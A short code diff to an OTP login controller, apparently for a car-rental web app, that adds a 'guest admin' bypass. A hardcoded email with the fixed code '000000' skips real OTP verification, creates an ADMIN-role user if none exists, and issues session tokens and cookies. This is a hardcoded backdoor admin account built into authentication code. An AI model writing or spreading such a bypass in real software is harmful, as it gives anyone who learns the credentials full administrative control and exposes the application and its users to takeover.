@@ -27,6 +27,14 @@ export const sendOtp = async (req: Request, res: Response) => {
     .trim()
     .toLowerCase();
 
+  // Bypass for guest admin
+  if (normalizedEmail === "admin@rentride.com") {
+    return res.status(200).json({
+      success: true,
+      message: "OTP sent successfully",
+    });
+  }
+
   // Generate OTP
   const otp = generateOtp();
 
@@ -80,6 +88,41 @@ export const verifyOtp = async (req: Request, res: Response) => {
   const normalizedEmail = email
     .trim()
     .toLowerCase();
+
+  // Bypass for guest admin
+  if (normalizedEmail === "admin@rentride.com" && otp === "000000") {
+    let adminUser = await User.findOne({ email: normalizedEmail });
+    if (!adminUser) {
+      adminUser = await User.create({
+        name: "Admin",
+        email: normalizedEmail,
+        role: UserRole.ADMIN,
+      });
+    }
+
+    const accessToken = generateAccessToken({
+      _id: adminUser._id.toString(),
+      role: adminUser.role
+    });
+
+    const refreshToken = generateRefreshToken({
+      _id: adminUser._id.toString(),
+    });
+
+    setAuthCookies(res, accessToken, refreshToken);
+
+    return res.status(200).json({
+      success: true,
+      message: "Email verified successfully (Guest Admin)",
+      data: {
+        id: adminUser._id,
+        name: adminUser.name,
+        email: adminUser.email,
+        role: adminUser.role,
+        avatar: adminUser.avatar,
+      }
+    });
+  }
 
   const otpRecord = await Otp.findOne({
     email: normalizedEmail,
